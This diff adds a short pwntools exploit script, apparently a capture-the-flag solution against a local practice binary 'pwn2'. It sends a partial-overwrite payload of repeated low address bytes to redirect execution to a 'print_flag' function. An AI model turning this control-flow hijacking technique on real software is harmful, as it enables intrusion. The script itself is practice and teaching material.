@@ -1,0 +1,16 @@
+from pwn import *
+
+p = process("./pwn2")
+'''
+p = gdb.debug("./pwn2", gdbscript = 
+b *select_func
+)
+'''
+e = ELF("./pwn2")
+
+win = e.symbols['print_flag']
+    
+payload = p8(win & 0xff) * 31
+p.sendlineafter(b"call?\n", payload)
+    
+p.interactive()
